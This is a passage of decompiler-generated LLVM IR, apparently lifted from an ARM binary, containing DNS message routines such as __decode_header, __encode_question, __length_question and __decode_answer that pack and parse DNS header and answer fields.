  %v2_11db0 = inttoptr i32 %v1_11db0 to i32*
  %v3_11db0 = load i32, i32* %v2_11db0, align 4
  %v1_11db4 = add i32 %v0_11db0, 4
  %v2_11db4 = inttoptr i32 %v1_11db4 to i32*
  %v3_11db4 = load i32, i32* %v2_11db4, align 4
  %v1_11db8 = add i32 %v0_11db0, 16
  %v2_11db8 = inttoptr i32 %v1_11db8 to i32*
  %v3_11db8 = load i32, i32* %v2_11db8, align 4
  %v1_11dbc = add i32 %tmp, 8
  %v2_11dbc = inttoptr i32 %v1_11dbc to i32*
  %v3_11dbc = load i32, i32* %v2_11dbc, align 4
  %v2_11dc0 = icmp eq i32 %v3_11db0, 0
  %. = select i1 %v2_11dc0, i32 0, i32 4
  %v2_11dcc = icmp eq i32 %v3_11db4, 0
  %v1_11dd0 = add i32 %v0_11db0, 20
  %v2_11dd0 = inttoptr i32 %v1_11dd0 to i32*
  %v3_11dd0 = load i32, i32* %v2_11dd0, align 4
  %storemerge12 = select i1 %v2_11dcc, i32 0, i32 128
  %v1_11ddc = urem i32 %v3_11dbc, 16
  %v2_11de0 = icmp eq i32 %v3_11db8, 0
  %.29 = select i1 %v2_11de0, i32 0, i32 2
  %v4_11dec = mul nuw nsw i32 %v1_11ddc, 8
  %v5_11dec = or i32 %v4_11dec, %.
  %v2_11df0 = icmp eq i32 %v3_11dd0, 0
  br i1 %v2_11df0, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_11da0
  %v2_11df4 = or i32 %v5_11dec, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_11da0, %bb25
  %v1_11dfc = phi i32 [ %v5_11dec, %dec_label_pc_11da0 ], [ %v2_11df4, %bb25 ]
  %v2_11df8 = or i32 %.29, %storemerge12
  %v2_11dfc = or i32 %v2_11df8, %v1_11dfc
  %v1_11e00 = trunc i32 %v2_11dfc to i8
  %v2_11e00 = load i32, i32* %r4.global-to-local, align 4
  %v3_11e00 = add i32 %v2_11e00, 2
  %v4_11e00 = inttoptr i32 %v3_11e00 to i8*
  store i8 %v1_11e00, i8* %v4_11e00, align 1
  %v0_11e04 = load i32, i32* %lr.global-to-local, align 4
  %v1_11e04 = add i32 %v0_11e04, 24
  %v1_11e08 = inttoptr i32 %v1_11e04 to i32*
  %v2_11e08 = load i32, i32* %v1_11e08, align 4
  %v3_11e08 = add i32 %v0_11e04, 28
  %v4_11e08 = inttoptr i32 %v3_11e08 to i32*
  %v5_11e08 = load i32, i32* %v4_11e08, align 4
  %v2_11e0c = icmp eq i32 %v2_11e08, 0
  %v1_11e10 = urem i32 %v5_11e08, 16
  %.30 = select i1 %v2_11e0c, i32 0, i32 128
  %v2_11e1c = or i32 %v1_11e10, %.30
  %v1_11e20 = trunc i32 %v2_11e1c to i8
  %v2_11e20 = load i32, i32* %r4.global-to-local, align 4
  %v3_11e20 = add i32 %v2_11e20, 3
  %v4_11e20 = inttoptr i32 %v3_11e20 to i8*
  store i8 %v1_11e20, i8* %v4_11e20, align 1
  %v0_11e24 = load i32, i32* %lr.global-to-local, align 4
  %v1_11e24 = add i32 %v0_11e24, 33
  %v2_11e24 = inttoptr i32 %v1_11e24 to i8*
  %v3_11e24 = load i8, i8* %v2_11e24, align 1
  %v2_11e28 = load i32, i32* %r4.global-to-local, align 4
  %v3_11e28 = add i32 %v2_11e28, 4
  %v4_11e28 = inttoptr i32 %v3_11e28 to i8*
  store i8 %v3_11e24, i8* %v4_11e28, align 1
  %v0_11e2c = load i32, i32* %lr.global-to-local, align 4
  %v1_11e2c = add i32 %v0_11e2c, 32
  %v2_11e2c = inttoptr i32 %v1_11e2c to i32*
  %v3_11e2c = load i32, i32* %v2_11e2c, align 4
  %v1_11e30 = trunc i32 %v3_11e2c to i8
  %v2_11e30 = load i32, i32* %r4.global-to-local, align 4
  %v3_11e30 = add i32 %v2_11e30, 5
  %v4_11e30 = inttoptr i32 %v3_11e30 to i8*
  store i8 %v1_11e30, i8* %v4_11e30, align 1
  %v0_11e34 = load i32, i32* %lr.global-to-local, align 4
  %v1_11e34 = add i32 %v0_11e34, 37
  %v2_11e34 = inttoptr i32 %v1_11e34 to i8*
  %v3_11e34 = load i8, i8* %v2_11e34, align 1
  %v2_11e38 = load i32, i32* %r4.global-to-local, align 4
  %v3_11e38 = add i32 %v2_11e38, 6
  %v4_11e38 = inttoptr i32 %v3_11e38 to i8*
  store i8 %v3_11e34, i8* %v4_11e38, align 1
  %v0_11e3c = load i32, i32* %lr.global-to-local, align 4
  %v1_11e3c = add i32 %v0_11e3c, 36
  %v2_11e3c = inttoptr i32 %v1_11e3c to i32*
  %v3_11e3c = load i32, i32* %v2_11e3c, align 4
  %v1_11e40 = trunc i32 %v3_11e3c to i8
  %v2_11e40 = load i32, i32* %r4.global-to-local, align 4
  %v3_11e40 = add i32 %v2_11e40, 7
  %v4_11e40 = inttoptr i32 %v3_11e40 to i8*
  store i8 %v1_11e40, i8* %v4_11e40, align 1
  %v0_11e44 = load i32, i32* %lr.global-to-local, align 4
  %v1_11e44 = add i32 %v0_11e44, 41
  %v2_11e44 = inttoptr i32 %v1_11e44 to i8*
  %v3_11e44 = load i8, i8* %v2_11e44, align 1
  %v2_11e48 = load i32, i32* %r4.global-to-local, align 4
  %v3_11e48 = add i32 %v2_11e48, 8
  %v4_11e48 = inttoptr i32 %v3_11e48 to i8*
  store i8 %v3_11e44, i8* %v4_11e48, align 1
  %v0_11e4c = load i32, i32* %lr.global-to-local, align 4
  %v1_11e4c = add i32 %v0_11e4c, 40
  %v2_11e4c = inttoptr i32 %v1_11e4c to i32*
  %v3_11e4c = load i32, i32* %v2_11e4c, align 4
  %v1_11e50 = trunc i32 %v3_11e4c to i8
  %v2_11e50 = load i32, i32* %r4.global-to-local, align 4
  %v3_11e50 = add i32 %v2_11e50, 9
  %v4_11e50 = inttoptr i32 %v3_11e50 to i8*
  store i8 %v1_11e50, i8* %v4_11e50, align 1
  %v0_11e54 = load i32, i32* %lr.global-to-local, align 4
  %v1_11e54 = add i32 %v0_11e54, 45
  %v2_11e54 = inttoptr i32 %v1_11e54 to i8*
  %v3_11e54 = load i8, i8* %v2_11e54, align 1
  %v2_11e58 = load i32, i32* %r4.global-to-local, align 4
  %v3_11e58 = add i32 %v2_11e58, 10
  %v4_11e58 = inttoptr i32 %v3_11e58 to i8*
  store i8 %v3_11e54, i8* %v4_11e58, align 1
  %v0_11e5c = load i32, i32* %lr.global-to-local, align 4
  %v1_11e5c = add i32 %v0_11e5c, 44
  %v2_11e5c = inttoptr i32 %v1_11e5c to i32*
  %v3_11e5c = load i32, i32* %v2_11e5c, align 4
  %v1_11e60 = trunc i32 %v3_11e5c to i8
  %v2_11e60 = load i32, i32* %r4.global-to-local, align 4
  %v3_11e60 = add i32 %v2_11e60, 11
  %v4_11e60 = inttoptr i32 %v3_11e60 to i8*
  store i8 %v1_11e60, i8* %v4_11e60, align 1
  %v2_11e6c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11e68

dec_label_pc_11e68:                               ; preds = %entry, %bb26
  %v2_11e6c = phi i32 [ %v3_11d8c, %entry ], [ %v2_11e6c.pre, %bb26 ]
  %v0_11e68 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_11e6c, i32* @r4, align 4
  ret i32 %v0_11e68

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11e68, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_11e70 = load i8, i8* %arg1, align 1
  %v4_11e70 = zext i8 %v3_11e70 to i32
  %v2_11e74 = add i32 %tmp, 1
  %v3_11e74 = inttoptr i32 %v2_11e74 to i8*
  %v4_11e74 = load i8, i8* %v3_11e74, align 1
  %v5_11e74 = zext i8 %v4_11e74 to i32
  %v4_11e78 = mul nuw nsw i32 %v4_11e70, 256
  %v5_11e78 = or i32 %v5_11e74, %v4_11e78
  %v2_11e7c = inttoptr i32 %arg2 to i32*
  store i32 %v5_11e78, i32* %v2_11e7c, align 4
  %v2_11e80 = add i32 %tmp, 2
  %v3_11e80 = inttoptr i32 %v2_11e80 to i8*
  %v4_11e80 = load i8, i8* %v3_11e80, align 1
  %tmp4 = icmp slt i8 %v4_11e80, 0
  %v3_11e84 = zext i1 %tmp4 to i32
  %v2_11e88 = add i32 %arg2, 4
  %v3_11e88 = inttoptr i32 %v2_11e88 to i32*
  store i32 %v3_11e84, i32* %v3_11e88, align 4
  %v4_11e8c = load i8, i8* %v3_11e80, align 1
  %div = udiv i8 %v4_11e8c, 8
  %tmp5 = urem i8 %div, 16
  %v1_11e94 = zext i8 %tmp5 to i32
  %v2_11e98 = add i32 %arg2, 8
  %v3_11e98 = inttoptr i32 %v2_11e98 to i32*
  store i32 %v1_11e94, i32* %v3_11e98, align 4
  %v4_11e9c = load i8, i8* %v3_11e80, align 1
  %div1 = udiv i8 %v4_11e9c, 4
  %tmp6 = urem i8 %div1, 2
  %v1_11ea4 = zext i8 %tmp6 to i32
  %v2_11ea8 = add i32 %arg2, 12
  %v3_11ea8 = inttoptr i32 %v2_11ea8 to i32*
  store i32 %v1_11ea4, i32* %v3_11ea8, align 4
  %v4_11eac = load i8, i8* %v3_11e80, align 1
  %div2 = udiv i8 %v4_11eac, 2
  %tmp7 = urem i8 %div2, 2
  %v1_11eb4 = zext i8 %tmp7 to i32
  %v2_11eb8 = add i32 %arg2, 16
  %v3_11eb8 = inttoptr i32 %v2_11eb8 to i32*
  store i32 %v1_11eb4, i32* %v3_11eb8, align 4
  %v4_11ebc = load i8, i8* %v3_11e80, align 1
  %tmp8 = urem i8 %v4_11ebc, 2
  %v1_11ec0 = zext i8 %tmp8 to i32
  %v2_11ec4 = add i32 %arg2, 20
  %v3_11ec4 = inttoptr i32 %v2_11ec4 to i32*
  store i32 %v1_11ec0, i32* %v3_11ec4, align 4
  %v2_11ec8 = add i32 %tmp, 3
  %v3_11ec8 = inttoptr i32 %v2_11ec8 to i8*
  %v4_11ec8 = load i8, i8* %v3_11ec8, align 1
  %tmp9 = icmp slt i8 %v4_11ec8, 0
  %v3_11ecc = zext i1 %tmp9 to i32
  %v2_11ed0 = add i32 %arg2, 24
  %v3_11ed0 = inttoptr i32 %v2_11ed0 to i32*
  store i32 %v3_11ecc, i32* %v3_11ed0, align 4
  %v4_11ed4 = load i8, i8* %v3_11ec8, align 1
  %tmp10 = urem i8 %v4_11ed4, 16
  %v1_11ed8 = zext i8 %tmp10 to i32
  %v2_11edc = add i32 %arg2, 28
  %v3_11edc = inttoptr i32 %v2_11edc to i32*
  store i32 %v1_11ed8, i32* %v3_11edc, align 4
  %v2_11ee0 = add i32 %tmp, 4
  %v3_11ee0 = inttoptr i32 %v2_11ee0 to i8*
  %v4_11ee0 = load i8, i8* %v3_11ee0, align 1
  %v5_11ee0 = zext i8 %v4_11ee0 to i32
  %v2_11ee4 = add i32 %tmp, 5
  %v3_11ee4 = inttoptr i32 %v2_11ee4 to i8*
  %v4_11ee4 = load i8, i8* %v3_11ee4, align 1
  %v5_11ee4 = zext i8 %v4_11ee4 to i32
  %v4_11ee8 = mul nuw nsw i32 %v5_11ee0, 256
  %v5_11ee8 = or i32 %v5_11ee4, %v4_11ee8
  %v2_11eec = add i32 %arg2, 32
  %v3_11eec = inttoptr i32 %v2_11eec to i32*
  store i32 %v5_11ee8, i32* %v3_11eec, align 4
  %v2_11ef0 = add i32 %tmp, 6
  %v3_11ef0 = inttoptr i32 %v2_11ef0 to i8*
  %v4_11ef0 = load i8, i8* %v3_11ef0, align 1
  %v5_11ef0 = zext i8 %v4_11ef0 to i32
  %v2_11ef4 = add i32 %tmp, 7
  %v3_11ef4 = inttoptr i32 %v2_11ef4 to i8*
  %v4_11ef4 = load i8, i8* %v3_11ef4, align 1
  %v5_11ef4 = zext i8 %v4_11ef4 to i32
  %v4_11ef8 = mul nuw nsw i32 %v5_11ef0, 256
  %v5_11ef8 = or i32 %v5_11ef4, %v4_11ef8
  %v2_11efc = add i32 %arg2, 36
  %v3_11efc = inttoptr i32 %v2_11efc to i32*
  store i32 %v5_11ef8, i32* %v3_11efc, align 4
  %v2_11f00 = add i32 %tmp, 8
  %v3_11f00 = inttoptr i32 %v2_11f00 to i8*
  %v4_11f00 = load i8, i8* %v3_11f00, align 1
  %v5_11f00 = zext i8 %v4_11f00 to i32
  %v2_11f04 = add i32 %tmp, 9
  %v3_11f04 = inttoptr i32 %v2_11f04 to i8*
  %v4_11f04 = load i8, i8* %v3_11f04, align 1
  %v5_11f04 = zext i8 %v4_11f04 to i32
  %v4_11f08 = mul nuw nsw i32 %v5_11f00, 256
  %v5_11f08 = or i32 %v5_11f04, %v4_11f08
  %v2_11f0c = add i32 %arg2, 40
  %v3_11f0c = inttoptr i32 %v2_11f0c to i32*
  store i32 %v5_11f08, i32* %v3_11f0c, align 4
  %v2_11f10 = add i32 %tmp, 11
  %v3_11f10 = inttoptr i32 %v2_11f10 to i8*
  %v4_11f10 = load i8, i8* %v3_11f10, align 1
  %v5_11f10 = zext i8 %v4_11f10 to i32
  %v2_11f14 = add i32 %tmp, 10
  %v3_11f14 = inttoptr i32 %v2_11f14 to i8*
  %v4_11f14 = load i8, i8* %v3_11f14, align 1
  %v5_11f14 = zext i8 %v4_11f14 to i32
  %v4_11f1c = mul nuw nsw i32 %v5_11f14, 256
  %v5_11f1c = or i32 %v4_11f1c, %v5_11f10
  %v2_11f20 = add i32 %arg2, 44
  %v3_11f20 = inttoptr i32 %v2_11f20 to i32*
  store i32 %v5_11f1c, i32* %v3_11f20, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 8, 9, 3, 5, 6, 7, 10, 1, 2, 11, 12, 13, 14, 15, 0, 4 }
  uselistorder i32 40, { 3, 4, 7, 6, 1, 5, 2, 0, 8, 9, 10, 11, 12 }
  uselistorder i32 28, { 9, 3, 4, 5, 10, 17, 26, 14, 16, 6, 15, 1, 18, 8, 2, 11, 12, 19, 20, 21, 22, 23, 24, 0, 25, 7, 13 }
  uselistorder i8 2, { 0, 1, 2, 3, 7, 4, 5, 6 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11f28 = load i32, i32* @r4, align 4
  store i32 %v3_11f28, i32* %stack_var_-16, align 4
  %v6_11f28 = load i32, i32* @r5, align 4
  %v9_11f28 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_11f30 = load i32, i32* %arg1, align 4
  store i32 %v2_11f30, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_11f3c = inttoptr i32 %v2_11f30 to i8*
  %v2_11f3c = call i32 @__encode_dotted(i8* %v1_11f3c)
  store i32 %v2_11f3c, i32* %r0.global-to-local, align 4
  %v1_11f40 = icmp slt i32 %v2_11f3c, 0
  br i1 %v1_11f40, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_11f48 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_11f48, i32* @r4, align 4
  store i32 %v6_11f28, i32* @r5, align 4
  store i32 %v9_11f28, i32* @r6, align 4
  ret i32 %v2_11f3c

bb6:                                              ; preds = %entry
  %v1_11f44 = load i32, i32* @r4, align 4
  %v2_11f44 = sub i32 %v1_11f44, %v2_11f3c
  %v0_11f50 = load i32, i32* @r6, align 4
  %v2_11f50 = add i32 %v0_11f50, %v2_11f3c
  store i32 %v2_11f50, i32* %r2.global-to-local, align 4
  %v7_11f54 = icmp sgt i32 %v2_11f44, 3
  br i1 %v7_11f54, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_11f58 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_11f58, i32* @r4, align 4
  store i32 %v6_11f28, i32* @r5, align 4
  store i32 %v9_11f28, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_11f5c = load i32, i32* @r5, align 4
  %v1_11f5c = add i32 %v0_11f5c, 5
  %v2_11f5c = inttoptr i32 %v1_11f5c to i8*
  %v3_11f5c = load i8, i8* %v2_11f5c, align 1
  %v5_11f60 = inttoptr i32 %v2_11f50 to i8*
  store i8 %v3_11f5c, i8* %v5_11f60, align 1
  %v0_11f64 = load i32, i32* @r5, align 4
  %v1_11f64 = add i32 %v0_11f64, 4
  %v2_11f64 = inttoptr i32 %v1_11f64 to i32*
  %v3_11f64 = load i32, i32* %v2_11f64, align 4
  %v1_11f68 = trunc i32 %v3_11f64 to i8
  %v2_11f68 = load i32, i32* %r2.global-to-local, align 4
  %v3_11f68 = add i32 %v2_11f68, 1
  %v4_11f68 = inttoptr i32 %v3_11f68 to i8*
  store i8 %v1_11f68, i8* %v4_11f68, align 1
  %v0_11f6c = load i32, i32* @r5, align 4
  %v1_11f6c = add i32 %v0_11f6c, 9
  %v2_11f6c = inttoptr i32 %v1_11f6c to i8*
  %v3_11f6c = load i8, i8* %v2_11f6c, align 1
  %v2_11f70 = load i32, i32* %r2.global-to-local, align 4
  %v3_11f70 = add i32 %v2_11f70, 2
  %v4_11f70 = inttoptr i32 %v3_11f70 to i8*
  store i8 %v3_11f6c, i8* %v4_11f70, align 1
  %v0_11f74 = load i32, i32* @r5, align 4
  %v1_11f74 = add i32 %v0_11f74, 8
  %v2_11f74 = inttoptr i32 %v1_11f74 to i32*
  %v3_11f74 = load i32, i32* %v2_11f74, align 4
  %v0_11f78 = load i32, i32* %r0.global-to-local, align 4
  %v1_11f78 = add i32 %v0_11f78, 4
  store i32 %v1_11f78, i32* %r0.global-to-local, align 4
  %v1_11f7c = trunc i32 %v3_11f74 to i8
  %v2_11f7c = load i32, i32* %r2.global-to-local, align 4
  %v3_11f7c = add i32 %v2_11f7c, 3
  %v4_11f7c = inttoptr i32 %v3_11f7c to i8*
  store i8 %v1_11f7c, i8* %v4_11f7c, align 1
  %v2_11f80 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11f80, i32* @r4, align 4
  store i32 %v6_11f28, i32* @r5, align 4
  store i32 %v9_11f28, i32* @r6, align 4
  ret i32 %v1_11f78

; uselistorder directives
  uselistorder i32 %v2_11f3c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_11f28, { 1, 0, 2 }
  uselistorder i32 %v6_11f28, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_11f88 = call i32 @__length_dotted()
  %v1_11f8c = icmp slt i32 %v0_11f88, 0
  br i1 %v1_11f8c, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_11f90 = add i32 %v0_11f88, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_11f94 = phi i32 [ %v0_11f88, %entry ], [ %v4_11f90, %bb ]
  ret i32 %v5_11f94

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_11f98 = load i32, i32* @r4, align 4
  %v6_11f98 = load i32, i32* @r5, align 4
  %v9_11f98 = load i32, i32* @r6, align 4
  %v12_11f98 = load i32, i32* @r7, align 4
  %v21_11f98 = load i32, i32* @sl, align 4
  %v2_11f9c = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_11f9c, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_11fb8 = call i32 @__decode_dotted()
  store i32 %v0_11fb8, i32* %r0.global-to-local, align 4
  store i32 %v0_11fb8, i32* @r7, align 4
  %v1_11fbc = icmp slt i32 %v0_11fb8, 0
  %v0_11fc0 = load i32, i32* @r4, align 4
  %v2_11fc0 = add i32 %v0_11fc0, %v0_11fb8
  store i32 %v2_11fc0, i32* %r8.global-to-local, align 4
  br i1 %v1_11fbc, label %bb14, label %dec_label_pc_11fd0

dec_label_pc_11fd0:                               ; preds = %entry
  %v1_11fc8 = load i32, i32* @r5, align 4
  %v2_11fc8 = sub i32 %v1_11fc8, %v2_11fc0
  %v1_11fd0 = add i32 %v2_11fc8, -10
  store i32 %v1_11fd0, i32* @r5, align 4
  %v6_11fd0 = icmp slt i32 %v1_11fd0, 0
  store i32 %v2_11f9c, i32* %r0.global-to-local, align 4
  %v0_11fd8 = load i32, i32* @sl, align 4
  %v2_11fd8 = add i32 %v0_11fd8, %v2_11fc0
  store i32 %v2_11fd8, i32* @r4, align 4
  br i1 %v6_11fd0, label %bb, label %dec_label_pc_11fe4

bb:                                               ; preds = %dec_label_pc_11fd0
  br label %bb14

dec_label_pc_11fe4:                               ; preds = %dec_label_pc_11fd0
  %v1_11fe4 = bitcast i32* %stack_var_-288 to i8*
  %v2_11fe4 = call i32 @__GI_strdup(i8* %v1_11fe4)
  store i32 %v2_11fe4, i32* %r0.global-to-local, align 4
  %v1_11fe8 = load i32, i32* @r6, align 4
  %v2_11fe8 = inttoptr i32 %v1_11fe8 to i32*
  store i32 %v2_11fe4, i32* %v2_11fe8, align 4
  %v0_11fec = load i32, i32* @sl, align 4
  %v1_11fec = load i32, i32* %r8.global-to-local, align 4
  %v2_11fec = add i32 %v1_11fec, %v0_11fec
  %v3_11fec = inttoptr i32 %v2_11fec to i8*
  %v4_11fec = load i8, i8* %v3_11fec, align 1
  %v6_11fec = zext i8 %v4_11fec to i32
  %v0_11ff0 = load i32, i32* @r4, align 4
  %v1_11ff0 = add i32 %v0_11ff0, 1
  %v2_11ff0 = inttoptr i32 %v1_11ff0 to i8*
  %v3_11ff0 = load i8, i8* %v2_11ff0, align 1
  %v4_11ff0 = zext i8 %v3_11ff0 to i32
  %v4_11ff4 = mul nuw nsw i32 %v6_11fec, 256
  %v5_11ff4 = or i32 %v4_11ff0, %v4_11ff4
  store i32 %v5_11ff4, i32* %r3.global-to-local, align 4
  %v1_11ff8 = load i32, i32* @r6, align 4
  %v2_11ff8 = add i32 %v1_11ff8, 4
  %v3_11ff8 = inttoptr i32 %v2_11ff8 to i32*
  store i32 %v5_11ff4, i32* %v3_11ff8, align 4
  %v0_11ffc = load i32, i32* @r4, align 4
  %v1_11ffc = add i32 %v0_11ffc, 2
  store i32 %v1_11ffc, i32* %r1.global-to-local, align 4
  %v2_12000 = inttoptr i32 %v1_11ffc to i8*
  %v3_12000 = load i8, i8* %v2_12000, align 1
  %v4_12000 = zext i8 %v3_12000 to i32
  %v1_12004 = add i32 %v0_11ffc, 3
  %v2_12004 = inttoptr i32 %v1_12004 to i8*
  %v3_12004 = load i8, i8* %v2_12004, align 1
  %v4_12004 = zext i8 %v3_12004 to i32
  %v4_12008 = mul nuw nsw i32 %v4_12000, 256
  %v5_12008 = or i32 %v4_12004, %v4_12008
  store i32 %v5_12008, i32* %r3.global-to-local, align 4
  %v1_1200c = load i32, i32* @r6, align 4
  %v2_1200c = add i32 %v1_1200c, 8
  %v3_1200c = inttoptr i32 %v2_1200c to i32*
  store i32 %v5_12008, i32* %v3_1200c, align 4
  %v0_12010 = load i32, i32* %r1.global-to-local, align 4
  %v1_12010 = add i32 %v0_12010, 2
  %v1_12014 = add i32 %v0_12010, 3
  %v2_12014 = inttoptr i32 %v1_12014 to i8*
  %v3_12014 = load i8, i8* %v2_12014, align 1
  %v4_12014 = zext i8 %v3_12014 to i32
  store i32 %v4_12014, i32* %r3.global-to-local, align 4
  %v2_12018 = inttoptr i32 %v1_12010 to i8*
  %v3_12018 = load i8, i8* %v2_12018, align 1
  %v4_12018 = zext i8 %v3_12018 to i32
  store i32 %v4_12018, i32* %r0.global-to-local, align 4
  %v1_1201c = add i32 %v0_12010, 5
  %v2_1201c = inttoptr i32 %v1_1201c to i8*
  %v3_1201c = load i8, i8* %v2_1201c, align 1
  %v4_1201c = zext i8 %v3_1201c to i32
  %v3_12020 = mul nuw nsw i32 %v4_12014, 65536
  store i32 %v3_12020, i32* %r3.global-to-local, align 4
  %v1_12024 = add i32 %v0_12010, 4
  %v2_12024 = inttoptr i32 %v1_12024 to i8*
  %v3_12024 = load i8, i8* %v2_12024, align 1
  %v4_12024 = zext i8 %v3_12024 to i32
  %v4_12028 = mul nuw i32 %v4_12018, 16777216
  %v5_12028 = or i32 %v4_12028, %v3_12020
  %v2_1202c = or i32 %v5_12028, %v4_1201c
  %v4_12030 = mul nuw nsw i32 %v4_12024, 256
  %v5_12030 = or i32 %v2_1202c, %v4_12030
  store i32 %v5_12030, i32* %r3.global-to-local, align 4
  %v1_12034 = load i32, i32* @r6, align 4
  %v2_12034 = add i32 %v1_12034, 12
  %v3_12034 = inttoptr i32 %v2_12034 to i32*
  store i32 %v5_12030, i32* %v3_12034, align 4
  %v0_12038 = load i32, i32* %r1.global-to-local, align 4
  %v1_12038 = add i32 %v0_12038, 6
  %v2_12038 = inttoptr i32 %v1_12038 to i8*
  %v3_12038 = load i8, i8* %v2_12038, align 1
  %v4_12038 = zext i8 %v3_12038 to i32
  %v0_1203c = load i32, i32* @r4, align 4
  %v1_1203c = add i32 %v0_1203c, 9
  %v2_1203c = inttoptr i32 %v1_1203c to i8*
  %v3_1203c = load i8, i8* %v2_1203c, align 1
  %v4_1203c = zext i8 %v3_1203c to i32
  %v1_12040 = add i32 %v0_1203c, 10
  store i32 %v1_12040, i32* %r0.global-to-local, align 4
  %v4_12044 = mul nuw nsw i32 %v4_12038, 256
  %v5_12044 = or i32 %v4_1203c, %v4_12044
  store i32 %v5_12044, i32* %r3.global-to-local, align 4
  %v0_12048 = load i32, i32* %r8.global-to-local, align 4
  %v1_12048 = add i32 %v0_12048, 10
  %v0_1204c = load i32, i32* @r5, align 4
  %v1_12050 = add nuw nsw i32 %v5_12044, 10
  store i32 %v1_12050, i32* %r1.global-to-local, align 4
  %v1_12054 = load i32, i32* @r6, align 4
  %v2_12054 = add i32 %v1_12054, 24
  %v3_12054 = inttoptr i32 %v2_12054 to i32*
  store i32 %v1_12048, i32* %v3_12054, align 4
  %v0_12058 = load i32, i32* %r0.global-to-local, align 4
  %v1_12058 = load i32, i32* @r6, align 4
  %v2_12058 = add i32 %v1_12058, 20
  %v3_12058 = inttoptr i32 %v2_12058 to i32*
  store i32 %v0_12058, i32* %v3_12058, align 4
  %v0_1205c = load i32, i32* %r3.global-to-local, align 4
  %v1_1205c = load i32, i32* @r6, align 4
  %v2_1205c = add i32 %v1_1205c, 16
  %v3_1205c = inttoptr i32 %v2_1205c to i32*
  store i32 %v0_1205c, i32* %v3_1205c, align 4
  %v0_12060 = load i32, i32* @r7, align 4
  %v1_12060 = load i32, i32* %r1.global-to-local, align 4
  %v2_12060 = add i32 %v1_12060, %v0_12060
  %v5_12064 = icmp slt i32 %v0_1204c, %v5_12044
  %.v2_12060 = select i1 %v5_12064, i32 -1, i32 %v2_12060
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_11fe4, %entry
  %v0_12068 = phi i32 [ %.v2_12060, %dec_label_pc_11fe4 ], [ %v1_11fd0, %bb ], [ %v0_11fb8, %entry ]
  store i32 %v0_12068, i32* %r0.global-to-local, align 4
  store i32 %v3_11f98, i32* @r4, align 4
  store i32 %v6_11f98, i32* @r5, align 4
  store i32 %v9_11f98, i32* @r6, align 4
  store i32 %v12_11f98, i32* @r7, align 4
  store i32 %v21_11f98, i32* @sl, align 4
  ret i32 %v0_12068

; uselistorder directives
  uselistorder i32 %v0_12068, { 1, 0 }
  uselistorder i32 %v5_12044, { 1, 0, 2 }
  uselistorder i32 %v3_12020, { 1, 0 }
  uselistorder i32 %v1_11fd0, { 0, 2, 1 }
  uselistorder i32 %v0_11fb8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 24, { 6, 7, 8, 15, 14, 0, 9, 10, 11, 16, 2, 5, 3, 1, 12, 17, 18, 19, 20, 21, 22, 4, 23, 13 }
  uselistorder i32 9, { 6, 7, 8, 9, 10, 1, 11, 2, 12, 0, 13, 14, 3, 15, 16, 17, 18, 19, 4, 5 }
  uselistorder i32 5, { 1, 15, 16, 17, 11, 5, 2, 12, 13, 6, 14, 3, 4, 0, 18, 19, 7, 8, 9, 10 }
  uselistorder i32 -10, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

